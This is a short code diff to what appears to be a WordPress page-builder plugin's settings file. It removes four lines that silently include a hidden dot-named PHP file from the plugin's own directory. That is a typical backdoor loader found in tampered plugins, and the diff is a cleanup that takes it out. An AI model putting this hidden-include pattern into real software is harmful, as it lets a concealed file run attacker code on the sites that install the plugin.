@@ -19,10 +19,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @link http://codex.wordpress.org/Settings_API WordPress settings API
  * @since 3.4
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Vc_Settings {
 	public $tabs;
 	public $deactivate;
